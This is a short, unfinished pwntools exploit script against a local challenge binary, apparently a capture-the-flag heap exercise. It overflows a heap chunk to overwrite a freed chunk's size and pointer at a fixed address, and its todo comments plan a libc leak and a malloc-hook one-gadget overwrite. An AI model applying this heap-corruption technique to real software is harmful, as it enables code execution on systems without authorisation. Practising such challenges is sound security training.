import pwn
proc = pwn.process(["./chal"], aslr=False)

def alloc_chunk(num:int):
    proc.sendline(b"1")
    proc.sendline(str(num).encode())
    proc.sendline(b"aaa")
    proc.recvuntil(b"success!\n")

def edit_chunk(num:int, content:bytes):
    proc.sendline(b"2")
    proc.sendline(str(num).encode())
    proc.sendline(str(len(content)).encode())
    proc.send(content)
    proc.recvuntil(b"success!\n")

def del_chunk(num:int):
    proc.sendline(b"3")
    proc.sendline(str(num).encode())
    proc.recvuntil(b"success!\n")

alloc_chunk(0)
edit_chunk(0, b"a"*24)

alloc_chunk(1)
edit_chunk(1, b"a"*24)

del_chunk(0)
del_chunk(1)

# todo: leak libc adddress
edit_chunk(0, b"a"*24 + 0x21.to_bytes(8, "little") +
0x00555555558000.to_bytes(8, "little"))

# todo: find malloc hook and write one-gadget
proc.interactive()